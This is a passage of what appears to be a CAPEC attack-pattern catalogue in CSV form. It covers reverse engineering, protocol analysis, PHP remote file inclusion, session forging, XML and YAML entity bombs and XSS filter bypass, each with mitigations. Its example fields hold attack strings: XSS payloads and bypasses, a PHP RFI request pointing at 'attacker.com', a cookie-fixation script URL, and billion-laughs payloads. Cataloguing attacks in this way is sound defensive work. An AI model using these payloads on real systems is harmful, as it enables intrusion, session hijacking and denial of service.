delivered to client is sanitized against an acceptable content specification.::Perform input validation for all remote content.::Perform output validation for all remote content.::Disable scripting languages such as JavaScript in browser::Session tokens for specific host::Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.::Privileges are constrained, if a script is loaded, ensure system runs in chroot jail or other limited authority mode::\",\"::Ajax applications enable rich functionality for browser based web applications. Applications like Google Maps deliver unprecedented ability to zoom in and out, scroll graphics, and change graphic presentation through Ajax. The security issues that an adversary may exploit in this instance are the relative lack of security features in JavaScript and the various browser's implementation of JavaScript, these security gaps are what XSS and a host of other client side vulnerabilities are based on. While Ajax may not open up new security holes, per se, due to the conversational aspects between client and server of Ajax communication, attacks can be optimized. A single zoom in or zoom out on a graphic in an Ajax application may round trip to the server dozens of times. One of the first steps many adversarys take is frequently footprinting an environment, this can include scanning local addresses like 192.*.*.* IP addresses, checking local directories, files, and settings for known vulnerabilities, and so on. <IMG SRC=javascript:alert('XSS')> The XSS script that is embedded in a given IMG tag can be manipulated to probe a different address on every click of the mouse or other motions that the Ajax application is aware of. In addition the enumerations allow for the adversary to nest sequential logic in the attacks. While Ajax applications do not open up brand new attack vectors, the existing attack vectors are more than adequate to execute attacks, and now these attacks can be optimized to sequentially execute and enumerate host environments.::~/.bash_profile and ~/.bashrc are executed in a user's context when a new shell opens or when a user logs in so that their environment is set correctly. ~/.bash_profile is executed for login shells and ~/.bashrc is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), ~/.bash_profile is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, ~/.bashrc is executed. This allows users more fine grained control over when they want certain commands executed. These files are meant to be written to by the local user to configure their own environment; however, adversaries can also insert code into these files to gain persistence each time a user logs in or opens a new shell.::\",\"::284::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1027.009:ENTRY NAME:Obfuscated Files or Information: Embedded Payloads::::TAXONOMY NAME:ATTACK:ENTRY ID:1546.004:ENTRY NAME:Event Triggered Execution:.bash_profile and .bashrc::::TAXONOMY NAME:ATTACK:ENTRY ID:1546.016:ENTRY NAME:Event Triggered Execution: Installer Packages::\",\"\",\n190,\"Reverse Engineer an Executable to Expose Assumed Hidden Functionality\",Detailed,Draft,\"An attacker analyzes a binary file or executable for the purpose of discovering the structure, function, and possibly source-code of the file by using a variety of analysis techniques to effectively determine how the software functions and operates. This type of analysis is also referred to as Reverse Code Engineering, as techniques exist for extracting source code from an executable. Several techniques are often employed for this purpose, both black box and white box. The use of computer bus analyzers and packet sniffers allows the binary to be studied at a level of interactions with its computing environment, such as a host OS, inter-process communication, and/or network communication. This type of analysis falls into the 'black box' category because it involves behavioral analysis of the software without reference to source code, object code, or protocol specifications.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:167::\",\"\",\"\",\"\",\"::Access to the target file such that it can be analyzed with the appropriate tools. A range of tools suitable for analyzing an executable or its operations::\",\"\",\"\",\"\",\"\",\"::912::\",\"\",\"TYPE:Other:NOTE:White box analysis techniques include file or binary analysis, debugging, disassembly, and decompilation, and generally fall into categories referred to as 'static' and 'dynamic' analysis. Static analysis encompasses methods which analyze the binary, or extract its source code or object code without executing the program. Dynamic analysis involves analyzing the program during execution. Some forms of file analysis tools allow the executable itself to be analyzed, the most basic of which can analyze features of the binary. More sophisticated forms of static analysis analyze the binary file and extract assembly code, and possibly source code representations, from analyzing the structure of the file itself. Dynamic analysis tools execute the binary file and monitor its in memory footprint, revealing its execution flow, memory usage, register values, and machine instructions. This type of analysis is most effective for analyzing the execution of binary files whose content has been obfuscated or encrypted in its native executable form. Debuggers allow the program's execution to be monitored, and depending upon the debugger's sophistication may show relevant source code for each step in execution, or may display and allow interactions with memory, variables, or values generated by the program during run-time operations. Disassemblers operate in reverse of assemblers, allowing assembly code to be extracted from a program as it executes machine code instructions. Disassemblers allow low-level interactions with the program as it executes, such as manipulating the program's run time operations. Decompilers can be utilized to analyze a binary file and extract source code from the compiled executable. Collectively, the tools and methods described are those commonly applied to a binary executable file and provide means for reverse engineering the file by revealing the hidden functions of its operation or composition.::\",\n191,\"Read Sensitive Constants Within an Executable\",Detailed,Draft,\"An adversary engages in activities to discover any sensitive constants present within the compiled code of an executable. These constants may include literal ASCII strings within the file itself, or possibly strings hard-coded into particular routines that can be revealed by code refactoring methods including static and dynamic analysis.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:167::\",\"\",\"::Access to a binary or executable such that it can be analyzed by various utilities.::\",\"\",\"::Binary analysis programs such as 'strings' or 'grep', or hex editors.::\",\"\",\"\",\"\",\"\",\"::798::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1552.001:ENTRY NAME:Unsecured Credentials:Credentials in files::\",\"TYPE:Other:NOTE:More sophisticated methods of searching for sensitive strings within a file involve disassembly or decompiling of the file. One could, for example, utilize disassembly methods on an ISAPI executable or dll to discover a hard-coded password within the code as it executes. This type of analysis usually involves four stages in which first a debugger is attached to the running process, anti-debugging countermeasures are circumvented or bypassed, the program is analyzed step-by-step, and breakpoints are established so that discrete functions and data structures can be analyzed. Debugging tools such as SoftICE, Ollydbg, or vendor supplied debugging tools are often used. Disassembly tools such as IDA pro, or similar tools, can also be employed. A third strategy for accessing sensitive strings within a binary involves the decompilation of the file itself into source code that reveals the strings. An example of this type of analysis involves extracting source code from a java JAR file and then using functionality within a java IDE to search the source code for sensitive, hard-coded information. In performing this analysis native java tools, such as jar are used to extract the compiled class files. Next, a java decompiler such as DJ is used to extract java source code from the compiled classes, revealing source code. Finally, the source code is audited to reveal sensitive information, a step that is usually assisted by source code analysis programs.::\",\n192,\"Protocol Analysis\",Meta,Stable,\"An adversary engages in activities to decipher and/or decode protocol information for a network or application communication protocol used for transmitting information between interconnected nodes or systems on a packet-switched data network. While this type of analysis involves the analysis of a networking protocol inherently, it does not require the presence of an actual or physical network.\",\"\",Low,Low,\"\",\"\",\"::Access to a binary executable.::The ability to observe and interact with a communication channel between communicating processes.::\",\"::SKILL:Knowlegde of the Open Systems Interconnection model (OSI model), and famililarity with Wireshark or some other packet analyzer.:LEVEL:High::\",\"::Depending on the type of analysis, a variety of tools might be required, such as static code and/or dynamic analysis tools. Alternatively, the effort might require debugging programs such as ollydbg, SoftICE, or disassemblers like IDA Pro. In some instances, packet sniffing or packet analyzing programs such as TCP dump or Wireshark are necessary. Lastly, specific protocol analysis might require tools such as PDB (Protocol Debug), or packet injection tools like pcap or Nemesis.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:Successful deciphering of protocol information compromises the confidentiality of future sensitive communications.::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data:NOTE:Modifying communications after successful deciphering of protocol information compromises integrity.::\",\"\",\"\",\"::326::\",\"\",\"TYPE:Other:NOTE:There are several challenges inherent to protocol analysis depending upon the nature of the protocol being analyzed. There may also be other types of factors which complicate the process such as encryption or ad hoc obfuscation of the protocol. In general there are two kinds of networking protocols, each associated with its own challenges and analysis approaches or methodologies. Some protocols are human-readable, which is to say they are text-based protocols. Examples of these types of protocols include HTTP, SMTP, and SOAP. Additionally, application-layer protocols can be embedded or encapsulated within human-readable protocols in the data portion of the packet. Typically, human-readable protocol implementations are susceptible to automatic decoding by the appropriate tools, such as Wireshark/ethereal, tcpdump, or similar protocol sniffers or analyzers. The presence of well-known protocol specifications in addition to easily identified protocol delimiters, such as Carriage Return or Line Feed characters (CRLF) result in text-based protocols susceptibility to direct scrutiny through manual processes. Protocol analysis against protocol implementations such as HTTP is often performed to identify idiosyncratic implementations of a protocol by a server or client. In the case of application-layer protocols which are embedded within text-based protocols, analysis techniques typically benefit from the well-known nature of the encapsulating protocols and can focus on discovering the semantic characteristics of the proprietary protocol or API, since the syntax and protocol delimiters of the underlying protocols can be readily identified. When performing protocol analysis of machine-readable (non-text-based) protocols difficulties emerge as the protocol itself was designed to be read by computing process. Such protocols are typically composed entirely in binary with no apparent syntax, grammar, or structural boundaries. Examples of these types of protocols are IP, UDP, and TCP. Binary protocols with published specifications can be automatically decoded by protocol analyzers, but in the case of proprietary, closed-specification, binary protocols there are no immediate indicators of packet syntax such as packet boundaries, delimiters, or structure, or the presence or absence of encryption or obfuscation. In these cases there is no one technology that can extract or reveal the structure of the packet on the wire, so it is necessary to use trial and error approaches while observing application behavior based on systematic mutations introduced at the packet-level. Tools such as Protocol Debug (PDB) or other packet injection suites are often employed. In cases where the binary executable is available, protocol analysis can be augmented with static and dynamic analysis techniques.::\",\n193,\"PHP Remote File Inclusion\",Detailed,Draft,\"In this pattern the adversary is able to load and execute arbitrary code remotely available from the application. This is usually accomplished through an insecurely configured PHP runtime environment and an improperly sanitized include or require call, which the user can then control to point to any web-accessible file. This allows adversaries to hijack the targeted application and force it to execute their own instructions.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:253::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey application] Using a browser or an automated tool, an adversary follows all public links on a web site. They record all the links they find.:TECHNIQUE:Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt variations on input parameters] The attack variants make use of a remotely available PHP script that generates a uniquely identifiable output when executed on the target application server. Possibly using an automated tool, an adversary requests variations on the inputs they surveyed before. They send parameters that include variations of payloads which include a reference to the remote PHP script. They record all the responses from the server that include the output of the execution of remote PHP script.:TECHNIQUE:Use a list of probe strings to inject in parameters of known URLs. The probe strings are variants of PHP remote file inclusion payloads which include a reference to the adversary controlled remote PHP script.:TECHNIQUE:Use a proxy tool to record results of manual input of remote file inclusion probes in known URLs.::STEP:3:PHASE:Exploit:DESCRIPTION:[Run arbitrary server-side code] As the adversary succeeds in exploiting the vulnerability, they are able to execute server-side code within the application. The malicious code has virtual access to the same resources as the targeted application. Note that the adversary might include shell code in their script and execute commands on the server under the same privileges as the PHP runtime is running with.:TECHNIQUE:Develop malicious PHP script that is injected through vectors identified during the Experiment Phase and executed by the application server to execute a custom PHP script.::\",\"::Target application server must allow remote files to be included in the require, include, etc. PHP directives::The adversary must have the ability to make HTTP requests to the target web application.::\",\"::SKILL:To inject the malicious payload in a web page:LEVEL:Low::SKILL:To bypass filters in the application:LEVEL:Medium::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::\",\"::Implementation: Perform input validation for all remote content, including remote and user-generated content::Implementation: Only allow known files to be included (allowlist)::Implementation: Make use of indirect references passed in URL parameters instead of file names::Configuration: Ensure that remote scripts cannot be include in the include or require PHP directives::\",\"::The adversary controls a PHP script on a server http://attacker.com/rfi.txt The .txt extension is given so that the script doesn't get executed by the attacker.com server, and it will be downloaded as text. The target application is vulnerable to PHP remote file inclusion as following: include($_GET['filename'] . '.txt') The adversary creates an HTTP request that passes their own script in the include: http://example.com/file.php?filename=http://attacker.com/rfi with the concatenation of the .txt prefix, the PHP runtime download the attack's script and the content of the script gets executed in the same context as the rest of the original script.::\",\"::98::80::\",\"\",\"\",\n194,\"Fake the Source of Data\",Standard,Stable,\"An adversary takes advantage of improper authentication to provide data or services under a falsified identity. The purpose of using the falsified identity may be to prevent traceability of the provided data or to assume the rights granted to another individual. One of the simplest forms of this attack would be the creation of an email message with a modified From field in order to appear that the message was sent from someone other than the actual sender. The root of the attack (in this case the email system) fails to properly authenticate the source and this results in the reader incorrectly performing the instructed action. Results of the attack vary depending on the details of the attack, but common results include privilege escalation, obfuscation of other attacks, and data corruption/manipulation.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:657::NATURE:CanPrecede:CAPEC ID:667::\",\"\",\"::This attack is only applicable when a vulnerable entity associates data or services with an identity. Without such an association, there would be no reason to fake the source.::\",\"\",\"::Resources required vary depending on the nature of the attack. Possible tools needed by an attacker could include tools to create custom network packets, specific client software, and tools to capture network traffic. Many variants of this attack require no attacker resources, however.::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Alter Execution Logic:NOTE:By faking the source of data or services, an adversary can cause a target to make incorrect decisions about how to proceed.::SCOPE:Integrity:TECHNICAL IMPACT:Gain Privileges:NOTE:By impersonating identities that have an increased level of access, an adversary gain privilege that they many not have otherwise had.::SCOPE:Integrity:TECHNICAL IMPACT:Hide Activities:NOTE:Faking the source of data or services can be used to create a false trail in logs as the target will associate any actions with the impersonated identity instead of the adversary.::\",\"\",\"\",\"::287::\",\"TAXONOMY NAME:WASC:ENTRY ID:38:ENTRY NAME:URL Redirector Abuse::\",\"\",\n195,\"Principal Spoof\",Standard,Draft,\"A Principal Spoof is a form of Identity Spoofing where an adversary pretends to be some other person in an interaction. This is often accomplished by crafting a message (either written, verbal, or visual) that appears to come from a person other than the adversary. Phishing and Pharming attacks often attempt to do this so that their attempts to gather sensitive information appear to come from a legitimate source. A Principal Spoof does not use stolen or spoofed authentication credentials, instead relying on the appearance and content of the message to reflect identity.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:151::\",\"\",\"::The target must associate data or activities with a person's identity and the adversary must be able to modify this identity without detection.::\",\"\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\n196,\"Session Credential Falsification through Forging\",Standard,Draft,\"An attacker creates a false but functional session credential in order to gain or usurp access to a service. Session credentials allow users to identify themselves to a service after an initial authentication without needing to resend the authentication information (usually a username and password) with every message. If an attacker is able to forge valid session credentials they may be able to bypass authentication or piggy-back off some other authenticated user's session. This attack differs from Reuse of Session IDs and Session Sidejacking attacks in that in the latter attacks an attacker uses a previous or existing credential without modification while, in a forging attack, the attacker must create their own credential, although it may be based on previously observed credentials.\",\"\",Medium,Medium,\"::NATURE:CanPrecede:CAPEC ID:384::NATURE:CanPrecede:CAPEC ID:61::NATURE:ChildOf:CAPEC ID:21::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Analyze and Understand Session IDs] The attacker finds that the targeted application use session credentials to identify legitimate users.:TECHNIQUE:An attacker makes many anonymous connections and records the session IDs.:TECHNIQUE:An attacker makes authorized connections and records the session tokens or credentials.::STEP:2:PHASE:Experiment:DESCRIPTION:[Create Session IDs.] Attackers craft messages containing their forged credentials in GET, POST request, HTTP headers or cookies.:TECHNIQUE:The attacker manipulates the HTTP request message and adds their forged session IDs in to the requests or cookies.::STEP:3:PHASE:Exploit:DESCRIPTION:[Abuse the Victim's Session Credentials] The attacker fixates falsified session ID to the victim when victim access the system. Once the victim has achieved a higher level of privilege, possibly by logging into the application, the attacker can now take over the session using the forged session identifier.:TECHNIQUE:The attacker loads the predefined or predicted session ID into their browser and browses to protected data or functionality.:TECHNIQUE:The attacker loads the predefined or predicted session ID into their software and utilizes functionality with the rights of the victim.::\",\"::The targeted application must use session credentials to identify legitimate users. Session identifiers that remains unchanged when the privilege levels change. Predictable session identifiers.::\",\"::SKILL:Forge the session credential and reply the request.:LEVEL:Medium::\",\"::Attackers may require tools to craft messages containing their forged credentials, and ability to send HTTP request to a web application.::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::\",\"::Implementation: Use session IDs that are difficult to guess or brute-force: One way for the attackers to obtain valid session IDs is by brute-forcing or guessing them. By choosing session identifiers that are sufficiently random, brute-forcing or guessing becomes very difficult.::Implementation: Regenerate and destroy session identifiers when there is a change in the level of privilege: This ensures that even though a potential victim may have followed a link with a fixated identifier, a new one is issued when the level of privilege changes.::\",\"::This example uses client side scripting to set session ID in the victim's browser. The JavaScript code document.cookie=sessionid=0123456789 fixates a falsified session credential into victim's browser, with the help of crafted a URL link. http://www.example.com/<script>document.cookie=sessionid=0123456789;</script> A similar example uses session ID as an argument of the URL. http://www.example.com/index.php/sessionid=0123456789 Once the victim clicks the links, the attacker may be able to bypass authentication or piggy-back off some other authenticated victim's session.::\",\"::384::664::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1134.002:ENTRY NAME:Access Token Manipulation: Create Process with Token::::TAXONOMY NAME:ATTACK:ENTRY ID:1134.003:ENTRY NAME:Access Token Manipulation: Make and Impersonate Token::::TAXONOMY NAME:ATTACK:ENTRY ID:1606:ENTRY NAME:Forge Web Credentials::\",\"\",\n197,\"Exponential Data Expansion\",Detailed,Draft,\"An adversary submits data to a target application which contains nested exponential data expansion to produce excessively large output. Many data format languages allow the definition of macro-like structures that can be used to simplify the creation of complex structures. However, this capability can be abused to create excessive demands on a processor's CPU and memory. A small number of nested expansions can result in an exponential growth in demands on memory.\",\"::TERM:Billion Laughs Attack:DESCRIPTION:::TERM:XML Bomb:DESCRIPTION:::TERM:XML Entity Expansion (XEE):DESCRIPTION:::\",High,Medium,\"::NATURE:ChildOf:CAPEC ID:230::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the target] An adversary determines the input data stream that is being processed by a data parser that supports using subsitituion on the victim's side.:TECHNIQUE:Use an automated tool to record all instances of URLs to process requests.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes requests.::STEP:2:PHASE:Experiment:DESCRIPTION:[Craft malicious payload] The adversary crafts a malicious message containing nested exponential expansion that completely uses up available server resources. See the Example Instances section for details on how to craft this malicious payload.::STEP:3:PHASE:Exploit:DESCRIPTION:[Send the message] Send the malicious crafted message to the target URL.::\",\"::This type of attack requires that the target must receive input but either fail to provide an upper limit for entity expansion or provide a limit that is so large that it does not preclude significant resource consumption.::\",\"::SKILL:Ability to craft nested data expansion messages.:LEVEL:Low::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption:NOTE:Denial of Service::\",\"::Design: Use libraries and templates that minimize unfiltered input. Use methods that limit entity expansion and throw exceptions on attempted entity expansion.::Implementation: For XML based data - disable altogether the use of inline DTD schemas when parsing XML objects. If a DTD must be used, normalize, filter and use an allowlist and parse with methods and routines that will detect entity expansion from untrusted sources.::\",\"::The most common example of this type of attack is the many laughs attack (sometimes called the 'billion laughs' attack). For example: <?xml version=1.0?><!DOCTYPE lolz [<!ENTITY lol lol><!ENTITY lol2 &lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;><!ENTITY lol3 &lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;><!ENTITY lol4 &lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;><!ENTITY lol5 &lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;><!ENTITY lol6 &lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;><!ENTITY lol7 &lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6><!ENTITY lol8 &lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;><!ENTITY lol9 &lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;> ]><lolz>&lol9;</lolz> This is well formed and valid XML according to the DTD. Each entity increases the number entities by a factor of 10. The line of XML containing lol9; expands out exponentially to a message with 10^9 entities. A small message of a few KBs in size can easily be expanded into a few GB of memory in the parser. By including 3 more entities similar to the lol9 entity in the above code to the DTD, the program could expand out over a TB as there will now be 10^12 entities. Depending on the robustness of the target machine, this can lead to resource depletion, application crash, or even the execution of arbitrary code through a buffer overflow.::This example is similar, but uses YAML. This was used to attack Kubernetes [REF-686] a: &a [lol,lol,lol,lol,lol,lol,lol,lol,lol]b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]::\",\"::770::776::\",\"TAXONOMY NAME:WASC:ENTRY ID:44:ENTRY NAME:XML Entity Expansion::\",\"\",\n198,\"XSS Targeting Error Pages\",Detailed,Draft,\"An adversary distributes a link (or possibly some other query structure) with a request to a third party web server that is malformed and also contains a block of exploit code in order to have the exploit become live code in the resulting error page.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:591::NATURE:ChildOf:CAPEC ID:592::NATURE:ChildOf:CAPEC ID:588::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs as URL parameters] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application, looking for URLs which use parameters.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Cause application to return error page] The adversary uses the URLs gathered in the Explore phase as a target list and injects various common script payloads and special characters into the parameters to see if an error page occurs, and if the injected payload is executed by the error page.:TECHNIQUE:Use a list of XSS probe strings to inject script in parameters of known URLs. If possible, the probe strings contain a unique identifier.:TECHNIQUE:Use a proxy tool to record results of manual input of XSS probes in known URLs.:TECHNIQUE:Use a list of HTML special characters to inject into parameters of known URLs and check if they caused errors::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS through an error page, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.:TECHNIQUE:Change a URL parameter to include a malicious script tag.:TECHNIQUE:Send information gathered from the malicious script to a remote endpoint.::STEP:4:PHASE:Exploit:DESCRIPTION:[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.:TECHNIQUE:Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.:TECHNIQUE:Put the malicious URL on a public forum, where many victims might accidentally click the link.::\",\"::A third party web server which fails to adequately sanitize messages sent in error pages.::The victim must be made to execute a query crafted by the adversary which results in the infected error report.::\",\"\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"\",\"::Design: Use libraries and templates that minimize unfiltered input.::Implementation: Normalize, filter and use an allowlist for any input that will be used in error messages.::Implementation: The victim should configure the browser to minimize active content from untrusted sources.::\",\"\",\"::81::\",\"\",\"\","
  },
  "doc-ee67e89c0c05c4a134a187ee635b4a34": {
    "content": "'ID,Name,Abstraction,Status,Description,Alternate Terms,Likelihood Of Attack,Typical Severity,Related Attack Patterns,Execution Flow,Prerequisites,Skills Required,Resources Required,Indicators,Consequences,Mitigations,Example Instances,Related Weaknesses,Taxonomy Mappings,Notes\n199,\"XSS Using Alternate Syntax\",Detailed,Draft,\"An adversary uses alternate forms of keywords or commands that result in the same action as the primary form but which may not be caught by filters. For example, many keywords are processed in a case insensitive manner. If the site's web filtering algorithm does not convert all tags into a consistent case before the comparison with forbidden keywords it is possible to bypass filters (e.g., incomplete black lists) by using an alternate case structure. For example, the script tag using the alternate forms of Script or ScRiPt may bypass filters where script is the only form tested. Other variants using different syntax representations are also possible as well as using pollution meta-characters or entities that are eventually ignored by the rendering engine. The attack can result in the execution of otherwise prohibited functionality.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:591::NATURE:ChildOf:CAPEC ID:592::NATURE:ChildOf:CAPEC ID:588::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.:TECHNIQUE:Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe identified potential entry points for XSS vulnerability] Possibly using an automated tool, an adversary requests variations on the inputs they surveyed before using alternate syntax. These inputs are designed to bypass incomplete filtering (e.g., incomplete HTML encoding etc.) and try many variations of characters injection that would enable the XSS payload. They record all the responses from the server that include unmodified versions of their script.:TECHNIQUE:Use a list of XSS probe strings to inject in parameters of known URLs. If possible, the probe strings contain a unique identifier. Attempt numerous variations based on form, format, syntax & encoding.:TECHNIQUE:Use a proxy tool to record results of manual input of XSS probes in known URLs.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.:TECHNIQUE:Change a URL parameter to include a malicious script tag created using alternate syntax to bypass filters.:TECHNIQUE:Send information gathered from the malicious script to a remote endpoint.::STEP:4:PHASE:Exploit:DESCRIPTION:[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.:TECHNIQUE:Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.:TECHNIQUE:Put the malicious URL on a public forum, where many victims might accidentally click the link.::\",\"::Target client software must allow scripting such as JavaScript.::\",\"::SKILL:To inject the malicious payload in a web page:LEVEL:Low::SKILL:To bypass non trivial filters in the application:LEVEL:High::\",\"::Ability to send HTTP request to a web application.::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::\",\"::Design: Use browser technologies that do not allow client side scripting.::Design: Utilize strict type, character, and encoding enforcement::Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.::Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.::Implementation: Perform input validation for all remote content, including remote and user-generated content::Implementation: Perform output validation for all remote content.::Implementation: Disable scripting languages such as JavaScript in browser::Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.::\",\"::In this example, the adversary tries to get <script>alert(1)</script> executed by the victim's browser. The target application employs regular expressions to make sure no script is being passed through the application to the web page; such a regular expression could be ((?i)script), and the application would replace all matches by this regex by the empty string. An adversary will then create a special payload to bypass this filter: <scriscriptpt>alert(1)</scscriptript> when the applications gets this input string, it will replace all script (case insensitive) by the empty string and the resulting input will be the desired vector by the adversary: <script>alert(1)</script> In this example, we assume that the application needs to write a particular string in a client-side JavaScript context (e.g., <script>HERE</script>). For the adversary to execute the same payload as in the previous example, they would need to send alert(1) if there was no filtering. The application makes use of the following regular expression as filter ((w+)s*(.*)|alert|eval|function|document) and replaces all matches by the empty string. For example each occurrence of alert(), eval(), foo() or even the string alert would be stripped. An adversary will then create a special payload to bypass this filter: this['al' + 'ert'](1) when the applications gets this input string, it won't replace anything and this piece of JavaScript has exactly the same runtime meaning as alert(1). The adversary could also have used non-alphanumeric XSS vectors to bypass the filter; for example, ($=[$=[]][(__=!$+$)[_=-~-~-~$]+({}+$)[_/_]+($$=($_=!''+$)[_/_]+$_[+$])])()[__[_/_]+__[_+~$]+$_[_]+$$](_/_) would be executed by the JavaScript engine like alert(1) is.::\",\"::87::\",\"\",\"\",\n2,\"Inducing Account Lockout\",Standard,Draft,\"An attacker leverages the security functionality of the system aimed at thwarting potential attacks to launch a denial of service attack against a legitimate system user. Many systems, for instance, implement a password throttling mechanism that locks an account after a certain number of incorrect log in attempts. An attacker can leverage this throttling mechanism to lock a legitimate user out of their own account. The weakness that is being leveraged by an attacker is the very security feature that has been put in place to counteract attacks.\",\"\",High,Medium,\"::NATURE:ChildOf:CAPEC ID:212::\",\"::STEP:1:PHASE:Experiment:DESCRIPTION:[Investigate account lockout behavior of system] Investigate the security features present in the system that may trigger an account lockout:TECHNIQUE:Analyze system documentation to find list of events that could 